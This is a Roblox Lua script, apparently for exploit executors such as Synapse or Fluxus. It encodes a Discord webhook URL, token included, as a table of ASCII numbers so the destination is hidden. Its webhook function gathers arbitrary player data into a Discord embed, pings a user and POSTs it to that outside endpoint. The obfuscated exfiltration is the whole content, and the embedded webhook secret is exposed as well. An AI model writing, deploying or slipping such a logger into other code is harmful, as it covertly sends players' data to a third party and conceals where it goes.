local HttpService = game:GetService("HttpService")

local webhook_ascii = {
    104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,
    97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,56,56,54,57,55,50,54,
    55,52,55,50,53,54,56,51,53,49,47,117,66,72,95,55,57,89,67,54,102,118,69,70,
    81,109,82,54,70,107,78,114,95,66,116,65,121,119,107,120,122,113,80,118,111,
    55,53,48,48,86,87,117,122,51,99,76,111,111,56,79,109,88,80,103,111,75,104,
    56,78,87,90,82,101,85,117,53,78
}

local function fromAsciiTable(t)
    local chars = {}
    for i = 1, #t do
        chars[i] = string.char(t[i])
    end
    return table.concat(chars)
end

local webhook_url = fromAsciiTable(webhook_ascii)

function webhook(dados)
    local fields = {}
    for k, v in pairs(dados) do
        table.insert(fields, {
            name = k,
            value = tostring(v),
            inline = false
        })
    end

    local payload = {
        content = "<@1350457070972829810> 🔔 Dados do player coletados!",
        embeds = {{
            title = "📡 Chakes do Jogador",
            color = 3447003,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local json = HttpService:JSONEncode(payload)
    local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

    if req then
        req({
            Url = webhook_url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end
